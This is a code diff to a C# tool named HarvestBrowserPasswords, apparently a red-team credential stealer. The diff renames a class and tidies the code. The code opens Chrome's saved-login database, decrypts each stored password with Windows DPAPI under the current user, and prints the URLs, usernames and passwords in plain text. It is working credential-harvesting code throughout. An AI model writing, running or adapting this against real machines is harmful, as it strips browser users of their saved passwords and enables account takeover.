@@ -7,9 +7,10 @@ using System.Security.Cryptography;
 
 namespace HarvestBrowserPasswords
 {
-    public class ChromeDatabaseConnection
+    public class ChromeDatabaseDecryptor
     {
-        public  ChromeDatabaseConnection(string databaseFilePath)
+        public string filePath;
+        public  ChromeDatabaseDecryptor(string databaseFilePath)
         {
             this.filePath = databaseFilePath;
             SQLiteConnection sqliteConnection = new SQLiteConnection(
@@ -35,14 +36,17 @@ namespace HarvestBrowserPasswords
                     {
                         continue;
                     }
+
                     string username = sqliteDataReader.GetString(1);
                     byte[] password = (byte[])sqliteDataReader[2]; //Cast to byteArray for DPAPI decryption
+
                     try
                     {
+                        //DPAPI Decrypt - Requires System.Security.dll and using System.Security.Cryptography
                         byte[] decryptedBytes = ProtectedData.Unprotect(password, null, DataProtectionScope.CurrentUser);
                         string decryptedAscii = System.Text.Encoding.ASCII.GetString(decryptedBytes);
                         Console.WriteLine($"[+] Decrypted!");
-                        Console.WriteLine($"\tURL: {url}");
+                        Console.WriteLine($"\tURL:      {url}");
                         Console.WriteLine($"\tUsername: {username}");
                         Console.WriteLine($"\tPassword: {decryptedAscii}");
                     }
@@ -57,8 +61,8 @@ namespace HarvestBrowserPasswords
             {
                 Console.WriteLine($"[!] Error connecting to database: {filePath}\nException: {e}");
             }
-        }
 
-        public string filePath;
+            sqliteConnection.Close();
+        }
     }
 }
